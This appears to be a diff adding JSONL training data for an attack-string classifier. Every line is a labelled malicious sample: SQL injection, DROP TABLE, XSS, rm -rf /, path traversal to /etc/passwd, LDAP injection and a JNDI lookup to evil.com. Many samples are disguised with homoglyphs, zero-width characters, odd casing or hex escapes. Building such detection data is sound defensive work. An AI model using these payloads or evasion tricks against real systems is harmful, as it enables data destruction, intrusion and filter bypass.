+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP TаBLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP TABLе users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP\\x20TABLE\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP TаBLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP TABLе users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP\\x20TABLE\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm\\x20-rf\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rM -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import os; os.systеm('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "impоrt os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import\\x20os;\\x20os.system('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "еxec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exeс('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
